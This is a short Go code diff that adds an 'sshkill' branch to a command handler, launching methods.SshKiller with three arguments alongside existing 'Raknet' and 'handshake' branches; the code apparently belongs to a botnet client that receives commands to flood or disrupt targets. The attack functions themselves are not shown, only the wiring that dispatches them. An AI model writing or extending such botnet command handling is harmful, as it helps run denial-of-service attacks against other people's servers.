@@ -30,6 +30,12 @@ func CommandHandler(command string) {
 		go methods.Raknet(args[1], args[2], args[3])
 	}
 
+	if strings.HasPrefix(commandd, "sshkill") {
+		args := strings.Split(commandd, " ")
+
+		go methods.SshKiller(args[1], args[2], args[3])
+	}
+
 	if strings.HasPrefix(commandd, "handshake") {
 		args := strings.Split(commandd, " ")
 
